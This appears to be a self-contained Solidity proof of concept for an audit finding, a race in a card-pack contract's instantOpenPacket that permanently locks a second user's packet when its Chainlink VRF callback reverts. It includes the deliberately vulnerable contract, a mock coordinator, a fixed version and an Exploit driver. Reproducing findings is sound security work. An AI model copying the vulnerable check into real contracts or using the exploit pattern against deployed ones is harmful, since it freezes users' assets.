// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of RipIt finding 62539 (H-02):
// "Insufficient restrictions in instantOpenPacket() risk DOS".
//
// ROOT CAUSE (TOCTOU): CardAllocationPool.instantOpenPacket checks only that at
// least one bundle exists (`length == 0` guard) at REQUEST time, but does NOT
// reserve/decrement a bundle. Two INSTANT_OPEN_PACKET requests for the same
// packetType submitted while only ONE bundle remains therefore BOTH pass the
// request-time check and both obtain a Chainlink VRF requestId.
//
// At FULFILL time, the first fulfillRandomWords() pops the only bundle in
// selectRandomCards() and serves user1. The second fulfillRandomWords() calls
// selectRandomCards() with an empty array, which reverts NoAvailableCardBundles.
// Per Chainlink VRF semantics a reverting fulfillRandomWords() is NOT retried,
// so user2's packet is permanently stuck / unopenable — a frozen asset.
//
// Faithful doubles used (opaque external boundary ONLY): a MockVRFCoordinator
// standing in for the Chainlink VRF Coordinator (records requestIds, exposes
// fulfill() to invoke the consumer callback exactly as the coordinator would).
// The vulnerable contract (CardAllocationPool) and its guard/pop logic are real.
// Card delivery is modeled via a per-owner counter + event (a modest, standard
// reconstruction, acknowledged in the finding triage).
// ─────────────────────────────────────────────────────────────────────────────

// Errors as declared on CardAllocationPool.
error UnauthorizedCaller();
error InsufficientCardBundles();
error NoAvailableCardBundles();

interface ICardAllocationPool {
    function instantOpenPacket(uint256 packetId, uint256 packetType, address owner) external;
}

interface IVRFConsumer {
    function rawFulfillRandomWords(uint256 requestId, uint256[] memory randomWords) external;
}

/// @dev Minimal marker token used to record the harm — user2's permanently
///      locked Packet NFT — at the SINK address. decimals=0: it counts packets.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 0;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

/// @dev Faithful minimal double for the Chainlink VRF Coordinator (the opaque
///      external randomness boundary). Records requestIds and exposes fulfill()
///      to invoke the consumer's callback exactly as the real coordinator does.
contract MockVRFCoordinator {
    address public consumer;
    uint256 public nextRequestId = 1;
    uint256[] public requestIds;

    function setConsumer(address c) external {
        consumer = c;
    }

    // Called by the consumer's requestRandomWords(). Signature mirrors Chainlink's.
    function requestRandomWords(bytes32, uint64, uint16, uint32, uint32) external returns (uint256 requestId) {
        requestId = nextRequestId++;
        requestIds.push(requestId);
    }

    // Off-chain-triggered VRF callback: coordinator -> consumer.rawFulfillRandomWords.
    function fulfill(uint256 requestId, uint256[] memory words) external {
        IVRFConsumer(consumer).rawFulfillRandomWords(requestId, words);
    }

    function requestIdCount() external view returns (uint256) {
        return requestIds.length;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract. instantOpenPacket / fulfillRandomWords / selectRandomCards
// bodies are the verbatim finding snippets (the length-zero guards, the requestId
// assignment, the fulfilled guard, the selectRandomCards call, and the empty-array
// revert). The missing reservation between the two length checks IS the root cause.
// ─────────────────────────────────────────────────────────────────────────────
contract CardAllocationPool is IVRFConsumer {
    struct CardBundle {
        uint256[] cardIds;
    }

    struct PacketOpenRequest {
        uint256 packetId;
        uint256 packetType;
        address owner;
        bool fulfilled;
    }

    address public packetNFTAddress;
    MockVRFCoordinator public coordinator;

    mapping(uint256 => CardBundle[]) internal packetTypeToCardBundles;
    mapping(uint256 => PacketOpenRequest) public requestIdToPacketOpen;

    // Reconstruction bookkeeping: card delivery modeled via counters/events.
    mapping(address => uint256) public cardsDelivered;
    uint256 public fulfilledCount;

    event PacketOpened(uint256 requestId, address owner, uint256 numCards);

    constructor(address _coordinator, address _packetNFTAddress) {
        coordinator = MockVRFCoordinator(_coordinator);
        packetNFTAddress = _packetNFTAddress;
    }

    // Test seeding helper: append one card bundle to a packetType.
    function addCardBundle(uint256 packetType, uint256[] memory cardIds) external {
        packetTypeToCardBundles[packetType].push(CardBundle({cardIds: cardIds}));
    }

    function bundleCount(uint256 packetType) external view returns (uint256) {
        return packetTypeToCardBundles[packetType].length;
    }

    // ===================== VERBATIM vulnerable function =====================
    function instantOpenPacket(uint256 packetId, uint256 packetType, address owner) external {
        if (msg.sender != packetNFTAddress) revert UnauthorizedCaller();

        if (packetTypeToCardBundles[packetType].length == 0) revert InsufficientCardBundles(); // @> request-time check does NOT reserve/decrement a bundle: two same-block requests both pass while only one bundle exists (TOCTOU DoS)

        // Request randomness from Chainlink VRF
        uint256 requestId = requestRandomWords(packetType);

        requestIdToPacketOpen[requestId] =
            PacketOpenRequest({packetId: packetId, packetType: packetType, owner: owner, fulfilled: false});
    }
    // =======================================================================

    function requestRandomWords(uint256 /*packetType*/ ) internal returns (uint256) {
        return coordinator.requestRandomWords(bytes32(0), 0, 3, 200000, 1);
    }

    // Chainlink VRFConsumerBaseV2 entry point: only the coordinator may invoke.
    function rawFulfillRandomWords(uint256 requestId, uint256[] memory randomWords) external {
        require(msg.sender == address(coordinator), "only VRF coordinator");
        fulfillRandomWords(requestId, randomWords);
    }

    // ===================== VERBATIM vulnerable function =====================
    function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) internal {
        PacketOpenRequest storage request = requestIdToPacketOpen[requestId];
        if (request.fulfilled) revert("Already fulfilled");

        // fetch the available card bundles
        CardBundle[] storage cardBundles = packetTypeToCardBundles[request.packetType];

        // Select random cards using the provided randomness
        uint256[] memory selectedCards = selectRandomCards(cardBundles, randomWords[0]);

        // deliver the selected cards to the owner (delivery modeled via counter + event)
        request.fulfilled = true;
        cardsDelivered[request.owner] += selectedCards.length;
        fulfilledCount += 1;
        emit PacketOpened(requestId, request.owner, selectedCards.length);
    }
    // =======================================================================

    // ===================== VERBATIM vulnerable function =====================
    function selectRandomCards(CardBundle[] storage availableCardBundles, uint256 randomSeed)
        private
        returns (uint256[] memory selectedCardBundle)
    {
        if (availableCardBundles.length == 0) {
            revert NoAvailableCardBundles();
        }

        // pop a bundle (swap-and-pop): the single bundle is consumed by the first
        // fulfilment, so the second fulfilment hits the empty-array revert above.
        uint256 index = randomSeed % availableCardBundles.length;
        selectedCardBundle = availableCardBundles[index].cardIds;
        availableCardBundles[index] = availableCardBundles[availableCardBundles.length - 1];
        availableCardBundles.pop();
    }
    // =======================================================================
}

// ─────────────────────────────────────────────────────────────────────────────
// Faithful minimal Packet contract: reproduces initiateBurn's INSTANT_OPEN_PACKET
// branch, which calls instantOpenPacket on the pool. `caller` models the burning
// user (msg.sender in the real code); the pool authorizes on packetNFTAddress ==
// address(this) (the Packet contract), which is preserved verbatim.
//
//   if (params.burnType == BurnType.INSTANT_OPEN_PACKET) {
//       randomAllocationPool.instantOpenPacket(params.packetId, _packetTypeIds[params.packetId], msg.sender);
//   }
// ─────────────────────────────────────────────────────────────────────────────
contract Packet {
    ICardAllocationPool public randomAllocationPool;
    mapping(uint256 => uint256) internal _packetTypeIds;

    function setPool(address p) external {
        randomAllocationPool = ICardAllocationPool(p);
    }

    function setPacketType(uint256 packetId, uint256 packetType) external {
        _packetTypeIds[packetId] = packetType;
    }

    function initiateBurn(uint256 packetId, address caller) external {
        randomAllocationPool.instantOpenPacket(packetId, _packetTypeIds[packetId], caller);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract (negative control): instantOpenPacket RESERVES a bundle at
// request time, so the second same-block request reverts InsufficientCardBundles
// up front — no post-fulfilment stuck state is ever created.
// ─────────────────────────────────────────────────────────────────────────────
contract CardAllocationPoolFixed is IVRFConsumer {
    struct CardBundle {
        uint256[] cardIds;
    }

    struct PacketOpenRequest {
        uint256 packetId;
        uint256 packetType;
        address owner;
        bool fulfilled;
    }

    address public packetNFTAddress;
    MockVRFCoordinator public coordinator;

    mapping(uint256 => CardBundle[]) internal packetTypeToCardBundles;
    mapping(uint256 => PacketOpenRequest) public requestIdToPacketOpen;
    mapping(uint256 => uint256) public reservedCount; // packetType => in-flight requests

    mapping(address => uint256) public cardsDelivered;
    uint256 public fulfilledCount;

    event PacketOpened(uint256 requestId, address owner, uint256 numCards);

    constructor(address _coordinator, address _packetNFTAddress) {
        coordinator = MockVRFCoordinator(_coordinator);
        packetNFTAddress = _packetNFTAddress;
    }

    function addCardBundle(uint256 packetType, uint256[] memory cardIds) external {
        packetTypeToCardBundles[packetType].push(CardBundle({cardIds: cardIds}));
    }

    function bundleCount(uint256 packetType) external view returns (uint256) {
        return packetTypeToCardBundles[packetType].length;
    }

    function instantOpenPacket(uint256 packetId, uint256 packetType, address owner) external {
        if (msg.sender != packetNFTAddress) revert UnauthorizedCaller();

        // FIX: bundles minus already-reserved in-flight requests must be > 0,
        //      then reserve one so concurrent requests cannot exceed supply.
        if (packetTypeToCardBundles[packetType].length <= reservedCount[packetType]) revert InsufficientCardBundles();
        reservedCount[packetType] += 1;

        uint256 requestId = requestRandomWords(packetType);

        requestIdToPacketOpen[requestId] =
            PacketOpenRequest({packetId: packetId, packetType: packetType, owner: owner, fulfilled: false});
    }

    function requestRandomWords(uint256 /*packetType*/ ) internal returns (uint256) {
        return coordinator.requestRandomWords(bytes32(0), 0, 3, 200000, 1);
    }

    function rawFulfillRandomWords(uint256 requestId, uint256[] memory randomWords) external {
        require(msg.sender == address(coordinator), "only VRF coordinator");
        fulfillRandomWords(requestId, randomWords);
    }

    function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) internal {
        PacketOpenRequest storage request = requestIdToPacketOpen[requestId];
        if (request.fulfilled) revert("Already fulfilled");

        CardBundle[] storage cardBundles = packetTypeToCardBundles[request.packetType];
        uint256[] memory selectedCards = selectRandomCards(cardBundles, randomWords[0]);

        if (reservedCount[request.packetType] > 0) reservedCount[request.packetType] -= 1;
        request.fulfilled = true;
        cardsDelivered[request.owner] += selectedCards.length;
        fulfilledCount += 1;
        emit PacketOpened(requestId, request.owner, selectedCards.length);
    }

    function selectRandomCards(CardBundle[] storage availableCardBundles, uint256 randomSeed)
        private
        returns (uint256[] memory selectedCardBundle)
    {
        if (availableCardBundles.length == 0) {
            revert NoAvailableCardBundles();
        }
        uint256 index = randomSeed % availableCardBundles.length;
        selectedCardBundle = availableCardBundles[index].cardIds;
        availableCardBundles[index] = availableCardBundles[availableCardBundles.length - 1];
        availableCardBundles.pop();
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: two users burn INSTANT_OPEN_PACKET for the same packetType
// while only ONE bundle exists. Both pass the request-time check; VRF serves
// user1 (pops the only bundle) but user2's fulfillRandomWords REVERTS and is
// never retried, permanently locking user2's packet. Harm recorded as 1 locked
// Packet NFT minted to the SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant USER1 = 0x00000000000000000000000000000000000A1111;
    address internal constant USER2 = 0x00000000000000000000000000000000000B2222;

    uint256 internal constant PACKET_TYPE = 7;
    uint256 internal constant PACKET_ID_1 = 101;
    uint256 internal constant PACKET_ID_2 = 102;

    // Exposed results for the driver / Playground.
    bool public user1Served;
    bool public req2Reverted;
    bool public user2Fulfilled;
    uint256 public bundlesBefore;
    uint256 public bundlesAfter;
    uint256 public sinkMarkerBalance;
    address public poolAddr;
    address public markerAddr;

    function run() external payable {
        // --- deploy: vuln pool + doubles (marker LAST) ---
        Packet packet = new Packet(); // nonce 1
        MockVRFCoordinator coord = new MockVRFCoordinator(); // nonce 2
        CardAllocationPool pool = new CardAllocationPool(address(coord), address(packet)); // nonce 3
        MiniToken marker = new MiniToken("Locked Packet", "LOCKED-PACKET"); // nonce 4 (LAST)

        coord.setConsumer(address(pool));
        packet.setPool(address(pool));
        packet.setPacketType(PACKET_ID_1, PACKET_TYPE);
        packet.setPacketType(PACKET_ID_2, PACKET_TYPE);

        poolAddr = address(pool);
        markerAddr = address(marker);

        // --- seed exactly ONE bundle for PACKET_TYPE ---
        uint256[] memory cardIds = new uint256[](3);
        cardIds[0] = 1;
        cardIds[1] = 2;
        cardIds[2] = 3;
        pool.addCardBundle(PACKET_TYPE, cardIds);
        bundlesBefore = pool.bundleCount(PACKET_TYPE); // 1

        // --- both users initiate an INSTANT_OPEN_PACKET burn in the same block ---
        // BOTH pass the request-time `length == 0` check even though only 1 bundle exists.
        packet.initiateBurn(PACKET_ID_1, USER1); // -> requestId 1
        packet.initiateBurn(PACKET_ID_2, USER2); // -> requestId 2

        uint256 req1 = coord.requestIds(0);
        uint256 req2 = coord.requestIds(1);

        // --- VRF fulfils user1 first: pops the only bundle, user1 served ---
        uint256[] memory words1 = new uint256[](1);
        words1[0] = 42;
        coord.fulfill(req1, words1);
        user1Served = pool.cardsDelivered(USER1) > 0;

        // --- VRF fulfils user2: selectRandomCards reverts (NoAvailableCardBundles) ---
        // Chainlink does NOT retry a reverting fulfillRandomWords, so user2's packet
        // is permanently stuck / unopenable.
        uint256[] memory words2 = new uint256[](1);
        words2[0] = 99;
        try coord.fulfill(req2, words2) {
            req2Reverted = false;
        } catch {
            req2Reverted = true;
        }

        // user2's request stays unfulfilled (the reverted call rolled back).
        (,,, bool f2) = pool.requestIdToPacketOpen(req2);
        user2Fulfilled = f2;

        bundlesAfter = pool.bundleCount(PACKET_TYPE); // 0

        require(user1Served, "user1 should have been served");
        require(req2Reverted, "user2 fulfilment should have reverted (DoS)");
        require(!user2Fulfilled, "user2 request must remain permanently stuck");

        // --- HARM: user2's packet is a permanently locked asset -> mark 1 to SINK ---
        marker.mint(SINK, 1);
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}
